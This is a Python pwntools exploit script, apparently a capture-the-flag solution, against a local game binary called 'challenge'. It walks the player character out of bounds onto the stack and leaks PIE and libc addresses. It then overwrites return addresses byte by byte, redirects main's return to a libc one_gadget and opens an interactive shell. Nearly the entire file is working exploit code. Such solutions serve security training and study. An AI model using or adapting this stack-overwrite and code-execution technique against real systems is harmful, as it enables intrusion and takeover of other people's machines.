#coding = utf8
#!/usr/bin/python
from pwn import *
import sys, math

LOCAL = True

# 玩家信息
PLAYER_X = -1
PLAYER_Y = -1
CURRENT = -1
DEST = -1

# 怪物信息
ENEMY_X = 0
ENEMY_Y = 0
ENEMY_COOLDOWN = 5
ENEMY_DISTANCE = 0

# field数组首地址
REAL_FIELD = 0x7fffffffd400

"""
重新计算新的怪物位置和距离玩家的距离。
"""
def move_enemy():
	global PLAYER_X, PLAYER_Y, ENEMY_X, ENEMY_Y, ENEMY_COOLDOWN, ENEMY_DISTANCE

	if ENEMY_COOLDOWN < 3:		
		# Calculate new monster pos and distance
		EDX = (PLAYER_X - ENEMY_X) 
		EDY = (PLAYER_Y - ENEMY_Y) 

		ENEMY_X += 1 if EDX > 0 else -1
		ENEMY_Y += 1 if EDY > 0 else -1

		ENEMY_DISTANCE = math.sqrt((EDX*EDX) + (EDY*EDY))

	if ENEMY_COOLDOWN == 0:
		ENEMY_COOLDOWN = 6

	ENEMY_COOLDOWN -= 1

"""
沿指定方向移动玩家并更新怪物信息。
"""
def move(direction):
	global PLAYER_X, PLAYER_Y

	r.sendline(direction)

	if direction == "w":
		PLAYER_Y -= 1
	elif direction == "s":
		PLAYER_Y += 1
	elif direction == "a":
		PLAYER_X -= 1
	elif direction == "d":
		PLAYER_X += 1

	move_enemy()
	
"""
解析当前的游戏状态。
"""
def parse_screen():
	global ENEMY_X, ENEMY_Y, PLAYER_X, PLAYER_Y, CURRENT, DEST, ENEMY_DISTANCE

	r.sendline("f")

	r.recvuntil("Position: (")
	PLAYER_X = int(r.recvuntil(", ", drop=True))
	PLAYER_Y = int(r.recvuntil(")", drop=True))

	r.recvuntil("CURRENT CELL: ")
	r.recv(5)
	CURRENT = int("0x"+r.recvuntil(" ", drop=True), 16)

	r.recvuntil(" ")
	DEST = int("0x"+r.recvuntil("\n", drop=True), 16)

	log.info("PLAYER_X: %d / PLAYER_Y: %d / ENEMY_X: %d / ENEMY_Y: %d / ENEMY_DISTANCE: %d / Cur: %s / Dest: %s" % (PLAYER_X, PLAYER_Y, ENEMY_X, ENEMY_Y, ENEMY_DISTANCE, hex(CURRENT), hex(DEST)))


def go_headless():
	r.recvuntil("HEADLESS...\n")
	r.sendline("h")
	parse_screen()
	
"""
通过移出游戏场来初始化漏洞利用。
"""
def init_exploit_state():
	global ENEMY_X, ENEMY_Y

	log.info("Starting game, go out of bounds")

	for i in range(11):
		move("d")		

	for i in range(11):
		move("w")

	move("w")
	
	ENEMY_X = 9
	ENEMY_Y = 255

	parse_screen()

"""
将玩家移动到特定的x / y坐标。
"""
def goto_xy(dest_x, dest_y):
	global PLAYER_X, PLAYER_Y

	while (dest_y != PLAYER_Y):
		if (dest_y < PLAYER_Y):		
			move("w")
		elif (dest_y > PLAYER_Y):
			move("s")

	while (dest_x != PLAYER_X):		
		if (dest_x < PLAYER_X):
			move("a")
		elif (dest_x > PLAYER_X):
			move("d")

"""
将玩家移动到堆栈上特定地址的开头。
"""
def goto_address(address):
	# 计算 dest PLAYER_X/PLAYER_Y	
	dest_x = (address - REAL_FIELD) % 10
	dest_y = (address - REAL_FIELD) / 10

	log.info("Goto address %s : %d / %d" % (hex(address), dest_x, dest_y))

	goto_xy(dest_x, dest_y)

"""
解析当前位置的地址。
"""
def parse_qword():
	r1 = ""
	
	for i in range(6):
		parse_screen()
		r1 += chr(CURRENT)		
		move("d")

	parse_screen()
	return u64(r1.ljust(8, "\x00"))

"""
读取特定地址的值。
"""
def read_address(address):
	goto_address(address)	
	return parse_qword()

"""
更改当前单元格的值。
"""
def change_value(value):	
	if value == -0x10:
		r.sendline("2")
	elif value == 0x10:
		r.sendline("1")
	elif value == -0x1:
		r.sendline("-")
	elif value == 0x1:
		r.sendline("+")

	move_enemy()

"""
将指定地址从源值更改为目标值。
这将观察怪物的位置，如果怪物靠近它将取消当前写入并重新启动游戏。 
重新启动它将返回当前地址并继续覆盖直到目标值完全写入。
"""
def change_address(address, src_value, dest_value):
	global ENEMY_DISTANCE, PIELEAK

	log.info("Change address %s : %s => %s" % (hex(address), hex(src_value), hex(dest_value)))

	goto_address(address)

	cur_offset = 0

	for i in range(8):
		cur_byte = (src_value >> (i*8)) & 0xff
		dest_byte = (dest_value >> (i*8)) & 0xff

		# 只有在我们为这个字节做些事情时才会移动
		if cur_byte != dest_byte:			
			while cur_offset < i:
				move("d")	
				cur_offset += 1
		
		while cur_byte != dest_byte:	
			log.info("Change byte at %s : %s => %s" % (hex(address+cur_offset), hex(cur_byte), hex(dest_byte)))

			# 尝试修改当前字节，直到怪物靠近
			while (cur_byte >= dest_byte + 0x10) and (ENEMY_DISTANCE > 3):
				change_value(-0x10)
				cur_byte -= 0x10
			while (cur_byte > dest_byte) and (ENEMY_DISTANCE > 3):
				change_value(-0x1)
				cur_byte -= 0x1
			while (cur_byte <= dest_byte - 0x10) and (ENEMY_DISTANCE > 3):
				change_value(0x10)
				cur_byte += 0x10
			while (cur_byte < dest_byte) and (ENEMY_DISTANCE > 3):
				change_value(0x1)
				cur_byte += 0x1

			parse_screen()

			# 检查，如果因为怪物越来越近就取消
			if cur_byte != dest_byte:
				# 通过调用main_loop覆盖main_loop返回并退出
				log.info("Cancel address write and replay")

				change_address(0x7fffffffd4e8, PIELEAK, PIELEAK-5)

				# 退出并重复，直到我们再次到达当前地址并继续覆盖
				r.sendline("q")
				parse_screen()
				init_exploit_state()

				goto_address(address+cur_offset)
				
def exploit(r):
	global PIELEAK

	go_headless()	

	init_exploit_state()	

	log.info("Leak PIE")

	PIELEAK = read_address(0x7fffffffd4e8)
	e.address = PIELEAK - 0x25e0
	
	log.info("PIE leak          : %s" % hex(PIELEAK))
	log.info("PIE base          : %s" % hex(e.address))

	log.info("Overwrite main_loop ret for another round")
	change_address(0x7fffffffd4e8, PIELEAK, PIELEAK-5)

	log.info("Leak libc")

	LIBCLEAK = read_address(0x7fffffffd468)
	libc.address = LIBCLEAK - 0x396440

	log.info("LIBC leak         : %s" % hex(LIBCLEAK))

	log.info("Quit to return to initial state")
	
	r.sendline("q")
	parse_screen()
	init_exploit_state()

	log.info("Play until main return address is overwritten with one_gadget")

	CURRENT_MAIN_RET = libc.address + 0x202e1
	ONE_GADGET = libc.address + 0x3f306

	change_address(0x7fffffffdd38, CURRENT_MAIN_RET, ONE_GADGET)

	log.info("Main return address successfully overwritten. Quit to trigger shell...")

	r.sendline("q")

	r.recvuntil("EXIT!\n")
	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./challenge")
	libc = ELF("./libc-2.24.so")
	LOCAL = True
	r = process("./challenge", env={"LD_PRELOAD" : "./libc-2.24.so"})
	print util.proc.pidof(r)
	pause()
	exploit(r)
